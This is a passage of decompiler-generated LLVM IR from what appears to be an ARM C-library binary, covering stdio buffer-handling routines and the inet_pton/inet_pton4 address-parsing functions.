  %v3_18134 = icmp ne i32 %v2_18134, 0
  %v4_18134 = ashr i32 %v2_1812c, 31
  %v6_18134 = icmp eq i1 %v3_18134, false
  %v7_18134 = sub i32 %v5_18128, %v4_18134
  %v9_18134 = sext i1 %v6_18134 to i32
  %v10_18134 = add i32 %v7_18134, %v9_18134
  store i32 %v10_18134, i32* %r3.global-to-local, align 4
  %v2_18138 = sub i32 %v10_18134, %v5_18128
  %v4_18138 = xor i32 %v10_18134, %v5_18128
  %v5_18138 = xor i32 %v2_18138, %v10_18134
  %v6_18138 = and i32 %v5_18138, %v4_18138
  %v7_18138 = icmp slt i32 %v6_18138, 0
  %v8_18138 = icmp slt i32 %v2_18138, 0
  %v9_18138 = icmp eq i32 %v10_18134, %v5_18128
  store i32 %v2_18130, i32* %v1_18128, align 4
  %v5_1813c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1813c, i32* %v4_18128, align 4
  %v3_18140 = xor i1 %v8_18138, %v7_18138
  %v4_18140 = or i1 %v9_18138, %v3_18140
  br i1 %v4_18140, label %dec_label_pc_18144, label %dec_label_pc_18150

dec_label_pc_18144:                               ; preds = %bb14
  br i1 %v9_18138, label %dec_label_pc_18148, label %dec_label_pc_18154thread-pre-split

dec_label_pc_18148:                               ; preds = %dec_label_pc_18144
  %v0_18148 = load i32, i32* %r2.global-to-local, align 4
  %v1_18148 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_18148, %v1_18148
  br i1 %tmp18, label %dec_label_pc_18150, label %dec_label_pc_18154thread-pre-split

dec_label_pc_18150:                               ; preds = %dec_label_pc_18148, %bb14
  %v0_18150 = load i32, i32* %r4.global-to-local, align 4
  %v1_18150 = sub i32 0, %v0_18150
  store i32 %v1_18150, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18154

dec_label_pc_18154thread-pre-split:               ; preds = %dec_label_pc_18148, %dec_label_pc_18144
  %v0_18154.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18154

dec_label_pc_18154:                               ; preds = %dec_label_pc_18154thread-pre-split, %dec_label_pc_18150
  %v0_18154 = phi i32 [ %v0_18154.pr, %dec_label_pc_18154thread-pre-split ], [ %v1_18150, %dec_label_pc_18150 ]
  %v1_18154 = icmp slt i32 %v0_18154, 0
  br i1 %v1_18154, label %dec_label_pc_1815c, label %dec_label_pc_18170

dec_label_pc_1815c:                               ; preds = %dec_label_pc_18154
  %v0_1815c = call i32 @__GI___errno_location()
  store i32 %v0_1815c, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_18164 = inttoptr i32 %v0_1815c to i32*
  store i32 75, i32* %v2_18164, align 4
  %v0_18170.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18170

dec_label_pc_1816c:                               ; preds = %dec_label_pc_180f0, %dec_label_pc_180e8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18170

dec_label_pc_18170:                               ; preds = %dec_label_pc_18154, %dec_label_pc_1815c, %dec_label_pc_1816c
  %v0_18170 = phi i32 [ %v0_18154, %dec_label_pc_18154 ], [ %v0_18170.pre, %dec_label_pc_1815c ], [ -1, %dec_label_pc_1816c ]
  store i32 %v0_18170, i32* %r0.global-to-local, align 4
  %v2_18178 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18178, i32* @r4, align 4
  ret i32 %v0_18170

; uselistorder directives
  uselistorder i32 %v0_18170, { 1, 0 }
  uselistorder i1 %v9_18138, { 1, 0 }
  uselistorder i32 %v2_18138, { 1, 0 }
  uselistorder i32 %v10_18134, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_18128, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18170, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 3, 2, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18180 = load i32, i32* @r4, align 4
  store i32 %v3_18180, i32* %stack_var_-8, align 4
  %v1_18184 = add i32 %arg1, 8
  %v1_18188 = inttoptr i32 %v1_18184 to i32*
  %v2_18188 = load i32, i32* %v1_18188, align 4
  %v3_18188 = add i32 %arg1, 12
  %v4_18188 = inttoptr i32 %v3_18188 to i32*
  %v5_18188 = load i32, i32* %v4_18188, align 4
  %v2_1818c = sub i32 %v5_18188, %v2_18188
  store i32 %v2_1818c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18194 = inttoptr i32 %arg1 to i16*
  %v4_18194 = call i32 @__stdio_READ(i16* %v3_18194, i32 %v2_18188, i32 %v2_1818c)
  %v0_18198 = load i32, i32* @r4, align 4
  %v1_18198 = add i32 %v0_18198, 8
  %v2_18198 = inttoptr i32 %v1_18198 to i32*
  %v3_18198 = load i32, i32* %v2_18198, align 4
  store i32 %v3_18198, i32* %r2.global-to-local, align 4
  %v2_1819c = add i32 %v3_18198, %v4_18194
  %v2_181a0 = add i32 %v0_18198, 20
  %v3_181a0 = inttoptr i32 %v2_181a0 to i32*
  store i32 %v2_1819c, i32* %v3_181a0, align 4
  %v0_181a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_181a4 = load i32, i32* @r4, align 4
  %v2_181a4 = add i32 %v1_181a4, 16
  %v3_181a4 = inttoptr i32 %v2_181a4 to i32*
  store i32 %v0_181a4, i32* %v3_181a4, align 4
  %v2_181a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_181a8, i32* @r4, align 4
  ret i32 %v4_18194

; uselistorder directives
  uselistorder i32 %v4_18194, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_181b0 = load i32, i32* @r4, align 4
  store i32 %v3_181b0, i32* %stack_var_-12, align 4
  %v0_181b4 = load i32, i32* @r0, align 4
  %v1_181b4 = inttoptr i32 %v0_181b4 to i16*
  %v2_181b4 = load i16, i16* %v1_181b4, align 2
  %v3_181b4 = zext i16 %v2_181b4 to i32
  store i32 %v3_181b4, i32* %r3.global-to-local, align 4
  %v0_181b8 = load i32, i32* @r1, align 4
  %v2_181b8 = and i32 %v0_181b8, %v3_181b4
  %v4_181b8 = icmp eq i32 %v2_181b8, 0
  store i32 %v0_181b4, i32* @r4, align 4
  br i1 %v4_181b8, label %dec_label_pc_181c8, label %dec_label_pc_181d8

dec_label_pc_181c8:                               ; preds = %entry
  %v1_181c8 = and i32 %v3_181b4, 2176
  %v2_181c8 = icmp eq i32 %v1_181c8, 0
  br i1 %v2_181c8, label %dec_label_pc_181d0, label %dec_label_pc_181e4

dec_label_pc_181d0:                               ; preds = %dec_label_pc_181c8
  %v2_181d0 = or i32 %v0_181b8, %v3_181b4
  store i32 %v2_181d0, i32* %r3.global-to-local, align 4
  %v1_181d4 = trunc i32 %v2_181d0 to i16
  store i16 %v1_181d4, i16* %v1_181b4, align 2
  %v0_181d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_181d8

dec_label_pc_181d8:                               ; preds = %entry, %dec_label_pc_181d0
  %v0_181d8 = phi i32 [ %v0_181b4, %entry ], [ %v0_181d8.pre, %dec_label_pc_181d0 ]
  %v1_181d8 = inttoptr i32 %v0_181d8 to i16*
  %v2_181d8 = load i16, i16* %v1_181d8, align 2
  %v3_181d8 = zext i16 %v2_181d8 to i32
  store i32 %v3_181d8, i32* %r3.global-to-local, align 4
  %v1_181dc = and i32 %v3_181d8, 16
  store i32 %v1_181dc, i32* %r5.global-to-local, align 4
  %v2_181dc = icmp eq i32 %v1_181dc, 0
  br i1 %v2_181dc, label %dec_label_pc_18204, label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %dec_label_pc_181c8, %dec_label_pc_181d8
  %v0_181e4 = call i32 @__GI___errno_location()
  store i32 %v0_181e4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_181ec = inttoptr i32 %v0_181e4 to i32*
  store i32 9, i32* %v2_181ec, align 4
  br label %dec_label_pc_181f0

dec_label_pc_181f0:                               ; preds = %dec_label_pc_1820c, %dec_label_pc_181e4
  %v0_181f0 = load i32, i32* @r4, align 4
  %v1_181f0 = inttoptr i32 %v0_181f0 to i16*
  %v2_181f0 = load i16, i16* %v1_181f0, align 2
  %v3_181f0 = zext i16 %v2_181f0 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_181f8 = or i32 %v3_181f0, 8
  store i32 %v1_181f8, i32* %r3.global-to-local, align 4
  %v1_181fc = trunc i32 %v1_181f8 to i16
  store i16 %v1_181fc, i16* %v1_181f0, align 2
  %v1_18244.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1823c

dec_label_pc_18204:                               ; preds = %dec_label_pc_181d8
  %v1_18204 = and i32 %v3_181d8, 64
  %v2_18204 = icmp eq i32 %v1_18204, 0
  br i1 %v2_18204, label %dec_label_pc_1822c, label %dec_label_pc_1820c

dec_label_pc_1820c:                               ; preds = %dec_label_pc_18204
  %v0_1820c = call i32 @__stdio_wcommit()
  store i32 %v0_1820c, i32* %r0.global-to-local, align 4
  %v2_18210 = icmp eq i32 %v0_1820c, 0
  br i1 %v2_18210, label %dec_label_pc_18218, label %dec_label_pc_181f0

dec_label_pc_18218:                               ; preds = %dec_label_pc_1820c
  %v0_18218 = load i32, i32* @r4, align 4
  %v1_18218 = inttoptr i32 %v0_18218 to i16*
  %v2_18218 = load i16, i16* %v1_18218, align 2
  %v3_18218 = zext i16 %v2_18218 to i32
  store i32 %v3_18218, i32* %r3.global-to-local, align 4
  %v1_1821c = add i32 %v0_18218, 8
  %v2_1821c = inttoptr i32 %v1_1821c to i32*
  %v3_1821c = load i32, i32* %v2_1821c, align 4
  %v1_18220 = and i32 %v3_18218, 65471
  store i32 %v1_18220, i32* %r3.global-to-local, align 4
  %v2_18224 = add i32 %v0_18218, 28
  %v3_18224 = inttoptr i32 %v2_18224 to i32*
  store i32 %v3_1821c, i32* %v3_18224, align 4
  %v0_18228 = load i32, i32* %r3.global-to-local, align 4
  %v1_18228 = trunc i32 %v0_18228 to i16
  %v2_18228 = load i32, i32* @r4, align 4
  %v3_18228 = inttoptr i32 %v2_18228 to i16*
  store i16 %v1_18228, i16* %v3_18228, align 2
  %v0_1822c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1822c

dec_label_pc_1822c:                               ; preds = %dec_label_pc_18204, %dec_label_pc_18218
  %v2_18234 = phi i32 [ %v0_181d8, %dec_label_pc_18204 ], [ %v0_1822c.pre, %dec_label_pc_18218 ]
  %v1_1822c = inttoptr i32 %v2_18234 to i16*
  %v2_1822c = load i16, i16* %v1_1822c, align 2
  %v3_1822c = zext i16 %v2_1822c to i32
  %v1_18230 = or i32 %v3_1822c, 1
  store i32 %v1_18230, i32* %r3.global-to-local, align 4
  %v1_18234 = trunc i32 %v1_18230 to i16
  store i16 %v1_18234, i16* %v1_1822c, align 2
  %v0_18238 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18238, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1823c

dec_label_pc_1823c:                               ; preds = %dec_label_pc_181f0, %dec_label_pc_1822c
  %v1_18244 = phi i32 [ %v1_18244.pre, %dec_label_pc_181f0 ], [ %v0_18238, %dec_label_pc_1822c ]
  %v2_18240 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18240, i32* @r4, align 4
  ret i32 %v1_18244

; uselistorder directives
  uselistorder i32 %v3_181b4, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1823c, { 1, 0 }
  uselistorder label %dec_label_pc_1822c, { 1, 0 }
  uselistorder label %dec_label_pc_181e4, { 1, 0 }
  uselistorder label %dec_label_pc_181d8, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_18254 = load i32, i32* %arg2, align 4
  %v3_18254 = add i32 %tmp, 4
  %v4_18254 = inttoptr i32 %v3_18254 to i32*
  %v5_18254 = load i32, i32* %v4_18254, align 4
  %v1_18258 = add i32 %arg1, 4
  %v2_18258 = inttoptr i32 %v1_18258 to i32*
  %v3_18258 = load i32, i32* %v2_18258, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_18260 = call i32 @__GI_lseek64(i32 %v3_18258, i32 %tmp, i32 %v2_18254, i32 %v5_18254)
  %v1_18264 = icmp slt i32* %arg2, null
  br i1 %v1_18264, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1826c5 = load i32, i32* @r4, align 4
  %v4_1826c6 = inttoptr i32 %v3_1826c5 to i32*
  store i32 %v4_18260, i32* %v4_1826c6, align 4
  %v6_1826c7 = add i32 %v3_1826c5, 4
  %v7_1826c8 = inttoptr i32 %v6_1826c7 to i32*
  store i32 %tmp, i32* %v7_1826c8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_18260, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 24, 25, 22, 23, 21, 20, 19, 26, 27, 28, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_18284 = load i32, i32* @r4, align 4
  %v6_18284 = load i32, i32* @r5, align 4
  %v15_18284 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1829c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1829c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_183141 = load i32, i32* @r0, align 4
  %v1_183142 = inttoptr i32 %v0_183141 to i8*
  %v2_183143 = load i8, i8* %v1_183142, align 1
  %v3_183144 = zext i8 %v2_183143 to i32
  store i32 %v3_183144, i32* @r3, align 4
  %v2_183185 = icmp eq i8 %v2_183143, 0
  store i1 %v2_183185, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_183185, label %dec_label_pc_18324, label %dec_label_pc_182b4

dec_label_pc_182b4:                               ; preds = %entry, %dec_label_pc_18314.backedge
  %v0_182b8 = phi i32 [ %v0_18314, %dec_label_pc_18314.backedge ], [ %v0_183141, %entry ]
  %v0_182f0 = phi i32 [ %v3_18314, %dec_label_pc_18314.backedge ], [ %v3_183144, %entry ]
  %v2_182c4.in = phi i32 [ %v3_18314, %dec_label_pc_18314.backedge ], [ %v3_183144, %entry ]
  %v2_182c4 = add nsw i32 %v2_182c4.in, -48
  %v2_182b4 = icmp ugt i32 %v2_182c4, 8
  %v7_182b4 = icmp eq i32 %v2_182c4, 9
  store i1 %v7_182b4, i1* %cpsr_z.global-to-local, align 1
  %v1_182b8 = add i32 %v0_182b8, 1
  store i32 %v1_182b8, i32* %r0.global-to-local, align 4
  %v2_182bc = xor i1 %v7_182b4, true
  %v3_182bc = and i1 %v2_182b4, %v2_182bc
  br i1 %v3_182bc, label %dec_label_pc_182f0, label %dec_label_pc_182c0

dec_label_pc_182c0:                               ; preds = %dec_label_pc_182b4
  %v0_182c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_182c0 = inttoptr i32 %v0_182c0 to i8*
  %v2_182c0 = load i8, i8* %v1_182c0, align 1
  %v3_182c0 = zext i8 %v2_182c0 to i32
  %v0_182c4 = load i32, i32* %r7.global-to-local, align 4
  %v3_182c4 = mul i32 %v0_182c4, %v3_182c0
  %v4_182c4 = add i32 %v3_182c4, %v2_182c4
  store i32 %v4_182c4, i32* @r3, align 4
  %v2_182c8 = icmp ugt i32 %v4_182c4, 254
  %v7_182c8 = icmp eq i32 %v4_182c4, 255
  store i1 %v7_182c8, i1* %cpsr_z.global-to-local, align 1
  %v2_182cc = xor i1 %v7_182c8, true
  %v3_182cc = and i1 %v2_182c8, %v2_182cc
  br i1 %v3_182cc, label %dec_label_pc_18348, label %dec_label_pc_182d0

dec_label_pc_182d0:                               ; preds = %dec_label_pc_182c0
  %v0_182d0 = load i32, i32* @lr, align 4
  %v2_182d0 = icmp eq i32 %v0_182d0, 0
  store i1 %v2_182d0, i1* %cpsr_z.global-to-local, align 1
  %v1_182d4 = trunc i32 %v4_182c4 to i8
  store i8 %v1_182d4, i8* %v1_182c0, align 1
  %v0_182d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_182d8, label %dec_label_pc_182dc, label %dec_label_pc_18314.backedge

dec_label_pc_182dc:                               ; preds = %dec_label_pc_182d0
  %v0_182dc = load i32, i32* @ip, align 4
  %v1_182dc = add i32 %v0_182dc, 1
  store i32 %v1_182dc, i32* @ip, align 4
  %v7_182e0 = icmp eq i32 %v1_182dc, 4
  store i1 %v7_182e0, i1* %cpsr_z.global-to-local, align 1
  %v0_182e4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_182e4, i32* @lr, align 4
  %v8_182e8 = icmp sgt i32 %v1_182dc, 4
  br i1 %v8_182e8, label %dec_label_pc_18348, label %dec_label_pc_18314.backedge

dec_label_pc_182f0:                               ; preds = %dec_label_pc_182b4
  %v7_182f0 = icmp eq i32 %v0_182f0, 46
  %v1_182f8 = load i32, i32* @lr, align 4
  %v2_182f8 = urem i32 %v1_182f8, 2
  %storemerge12 = select i1 %v7_182f0, i32 %v2_182f8, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_182fc = icmp eq i32 %storemerge12, 0
  store i1 %v2_182fc, i1* %cpsr_z.global-to-local, align 1
  %v0_18300 = load i32, i32* @r5, align 4
  store i32 %v0_18300, i32* @lr, align 4
  br i1 %v2_182fc, label %dec_label_pc_18348, label %dec_label_pc_18308

dec_label_pc_18308:                               ; preds = %dec_label_pc_182f0
  %v0_18308 = load i32, i32* @ip, align 4
  %v7_18308 = icmp eq i32 %v0_18308, 4
  store i1 %v7_18308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18308, label %dec_label_pc_18348, label %dec_label_pc_18310

dec_label_pc_18310:                               ; preds = %dec_label_pc_18308
  %v1_18310 = trunc i32 %v0_18300 to i8
  %v2_18310 = load i32, i32* %r1.global-to-local, align 4
  %v3_18310 = add i32 %v2_18310, 1
  %v4_18310 = inttoptr i32 %v3_18310 to i8*
  store i8 %v1_18310, i8* %v4_18310, align 1
  %v5_18310 = load i32, i32* %r1.global-to-local, align 4
  %v6_18310 = add i32 %v5_18310, 1
  store i32 %v6_18310, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18314.backedge

dec_label_pc_18314.backedge:                      ; preds = %dec_label_pc_18310, %dec_label_pc_182d0, %dec_label_pc_182dc
  %v0_18314 = load i32, i32* %r0.global-to-local, align 4
  %v1_18314 = inttoptr i32 %v0_18314 to i8*
  %v2_18314 = load i8, i8* %v1_18314, align 1
  %v3_18314 = zext i8 %v2_18314 to i32
  store i32 %v3_18314, i32* @r3, align 4
  %v2_18318 = icmp eq i8 %v2_18314, 0
  store i1 %v2_18318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18318, label %dec_label_pc_18314.dec_label_pc_18324_crit_edge, label %dec_label_pc_182b4

dec_label_pc_18314.dec_label_pc_18324_crit_edge:  ; preds = %dec_label_pc_18314.backedge
  %v0_18324.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_18324

dec_label_pc_18324:                               ; preds = %dec_label_pc_18314.dec_label_pc_18324_crit_edge, %entry
  %v0_18324 = phi i32 [ %v0_18324.pre, %dec_label_pc_18314.dec_label_pc_18324_crit_edge ], [ 0, %entry ]
  %v7_18324 = icmp eq i32 %v0_18324, 3
  store i1 %v7_18324, i1* %cpsr_z.global-to-local, align 1
  %v7_18328 = icmp slt i32 %v0_18324, 4
  br i1 %v7_18328, label %dec_label_pc_18348, label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %dec_label_pc_18324
  %v0_1832c = load i32, i32* @r4, align 4
  store i32 %v0_1832c, i32* @r0, align 4
  store i32 %v2_1829c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_18338 = call i32 @memcpy()
  br label %dec_label_pc_18348

dec_label_pc_18348:                               ; preds = %dec_label_pc_182c0, %dec_label_pc_182dc, %dec_label_pc_182f0, %dec_label_pc_18308, %dec_label_pc_18324, %dec_label_pc_1832c
  %storemerge = phi i32 [ 1, %dec_label_pc_1832c ], [ 0, %dec_label_pc_18324 ], [ 0, %dec_label_pc_18308 ], [ 0, %dec_label_pc_182f0 ], [ 0, %dec_label_pc_182dc ], [ 0, %dec_label_pc_182c0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_18284, i32* @r4, align 4
  store i32 %v6_18284, i32* @r5, align 4
  store i32 %v15_18284, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_18324, { 1, 0 }
  uselistorder i32 %v3_18314, { 2, 1, 0 }
  uselistorder i32 %v0_18314, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_182c4, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 1, 0 }
  uselistorder label %dec_label_pc_18348, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_18314.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_182b4, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_18354 = load i32, i32* @r4, align 4
  %v6_18354 = load i32, i32* @r5, align 4
  %v9_18354 = load i32, i32* @r6, align 4
  %v12_18354 = load i32, i32* @r7, align 4
  %v27_18354 = load i32, i32* @lr, align 4
  %v7_18360 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_18360, label %dec_label_pc_18380, label %dec_label_pc_18374

dec_label_pc_18374:                               ; preds = %entry
  %v7_18374 = icmp eq i32 %arg1, 10
  br i1 %v7_18374, label %dec_label_pc_18390, label %dec_label_pc_18548

dec_label_pc_18380:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_18388 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_18558

dec_label_pc_18390:                               ; preds = %dec_label_pc_18374
  %v2_18390 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1839c = bitcast i32* %stack_var_-56 to i8*
  %v3_1839c = call i32 @__GI_memset(i8* %v2_1839c, i32 0)
  %v0_183a0 = load i32, i32* @r5, align 4
  %v1_183a0 = inttoptr i32 %v0_183a0 to i8*
  %v2_183a0 = load i8, i8* %v1_183a0, align 1
  %v3_183a0 = zext i8 %v2_183a0 to i32
  store i32 %v3_183a0, i32* %r3.global-to-local, align 4
  %v7_183a4 = icmp eq i8 %v2_183a0, 58
  store i32 %v3_1839c, i32* @r6, align 4
  %v2_183ac = add i32 %v3_1839c, 16
  store i32 %v2_183ac, i32* %r8.global-to-local, align 4
  br i1 %v7_183a4, label %dec_label_pc_183b4, label %dec_label_pc_183c0

dec_label_pc_183b4:                               ; preds = %dec_label_pc_18390
  %v1_183b4 = add i32 %v0_183a0, 1
  %v2_183b4 = inttoptr i32 %v1_183b4 to i8*
  %v3_183b4 = load i8, i8* %v2_183b4, align 1
  %v4_183b4 = zext i8 %v3_183b4 to i32
  store i32 %v4_183b4, i32* %r3.global-to-local, align 4
  store i32 %v1_183b4, i32* @r5, align 4
  %v7_183b8 = icmp eq i8 %v3_183b4, 58
  br i1 %v7_183b8, label %dec_label_pc_183c0, label %dec_label_pc_18540

dec_label_pc_183c0:                               ; preds = %dec_label_pc_183b4, %dec_label_pc_18390
  %v0_183cc = phi i32 [ %v1_183b4, %dec_label_pc_183b4 ], [ %v0_183a0, %dec_label_pc_18390 ]
  store i32 -32952, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_183c8 = load i32, i32* @r4, align 4
  %v2_183c8 = add i32 %v0_183c8, -32952
  store i32 %v0_183cc, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_183c8, i32* %stack_var_-64, align 4
  %v1_184a43 = inttoptr i32 %v0_183cc to i8*
  %v2_184a44 = load i8, i8* %v1_184a43, align 1
  %v3_184a45 = zext i8 %v2_184a44 to i32
  store i32 %v3_184a45, i32* @r4, align 4
  %v2_184a86 = icmp eq i8 %v2_184a44, 0
  br i1 %v2_184a86, label %dec_label_pc_184b0.thread, label %dec_label_pc_183e0

dec_label_pc_184b0.thread:                        ; preds = %dec_label_pc_183c0
  store i32 %v3_1839c, i32* @r4, align 4
  br label %dec_label_pc_184dc

dec_label_pc_183e0:                               ; preds = %dec_label_pc_183c0, %dec_label_pc_184a4.backedge.dec_label_pc_183e0_crit_edge
  %v0_183e4 = phi i32 [ %v3_184a4, %dec_label_pc_184a4.backedge.dec_label_pc_183e0_crit_edge ], [ %v3_184a45, %dec_label_pc_183c0 ]
  %v2_183e0 = phi i32 [ %v2_183e0.pre, %dec_label_pc_184a4.backedge.dec_label_pc_183e0_crit_edge ], [ %v2_183c8, %dec_label_pc_183c0 ]
  store i32 %v2_183e0, i32* @r0, align 4
  %v1_183e4 = or i32 %v0_183e4, 32
  store i32 %v1_183e4, i32* %r1.global-to-local, align 4
  %v2_183e8 = call i32 @__GI_strchr(i32 %v2_183e0, i32 %v1_183e4)
  %v2_183ec = icmp eq i32 %v2_183e8, 0
  %v0_183f0 = load i32, i32* @r5, align 4
  %v1_183f0 = add i32 %v0_183f0, 1
  store i32 %v1_183f0, i32* @r5, align 4
  br i1 %v2_183ec, label %dec_label_pc_18414, label %dec_label_pc_183f8

dec_label_pc_183f8:                               ; preds = %dec_label_pc_183e0
  %v2_183f8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_183f8, i32* %r2.global-to-local, align 4
  %v2_183fc = sub i32 %v2_183e8, %v2_183f8
  %v1_18400 = load i32, i32* @r7, align 4
  %v4_18400 = mul i32 %v1_18400, 16
  %v5_18400 = or i32 %v4_18400, %v2_183fc
  store i32 %v5_18400, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_18400, 65536
  br i1 %tmp36, label %dec_label_pc_184a0, label %dec_label_pc_18540

dec_label_pc_18414:                               ; preds = %dec_label_pc_183e0
  %v0_18414 = load i32, i32* @r4, align 4
  %v7_18414 = icmp eq i32 %v0_18414, 58
  br i1 %v7_18414, label %dec_label_pc_1841c, label %dec_label_pc_18474

dec_label_pc_1841c:                               ; preds = %dec_label_pc_18414
  %v0_1841c = load i32, i32* %sb.global-to-local, align 4
  %v2_1841c = icmp eq i32 %v0_1841c, 0
  br i1 %v2_1841c, label %dec_label_pc_18424, label %dec_label_pc_18438

dec_label_pc_18424:                               ; preds = %dec_label_pc_1841c
  %v0_18424 = load i32, i32* %fp.global-to-local, align 4
  %v2_18424 = icmp eq i32 %v0_18424, 0
  br i1 %v2_18424, label %dec_label_pc_1842c, label %dec_label_pc_18540

dec_label_pc_1842c:                               ; preds = %dec_label_pc_18424
  %v0_1842c = load i32, i32* @r6, align 4
  store i32 %v0_1842c, i32* %fp.global-to-local, align 4
